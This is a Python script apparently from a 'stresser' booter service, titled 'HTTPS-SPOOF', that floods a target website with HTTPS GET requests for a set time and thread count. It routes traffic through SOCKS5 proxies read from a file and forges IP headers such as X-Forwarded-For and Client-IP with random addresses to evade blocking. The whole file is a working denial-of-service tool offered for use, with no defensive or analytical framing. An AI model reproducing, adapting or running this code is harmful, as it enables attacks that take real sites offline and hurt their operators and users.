# Raven Stresser Method
# HTTPS-SPOOF
# Created by SkyWtkh

import socket
import socks
import ssl
import time
import random
import sys
import threading
from urllib.parse import urlparse

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def attack(url, timer):
    timeout = time.time() + int(timer)
    proxies = open("socks.txt").readlines()
    proxy = random.choice(proxies).strip().split(":")
    req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
    req += "Via: "+spoofer()+"\r\n"
    req += "Client-IP: "+spoofer()+"\r\n"
    req += "X-Forwarded-For: "+spoofer()+"\r\n"
    req += "Real-IP: "+spoofer()+"\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            try:
                for i in range(5000000000):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def launch(url, timer, threads):
    try:
        for i in range(int(threads)):
            threading.Thread(target=attack, args=(url, timer)).start()
    except:
        pass

try:
    launch(str(sys.argv[1]), sys.argv[2], sys.argv[3])
except IndexError:
    print('usage: https-spoof.py <url> <time> <threads>')
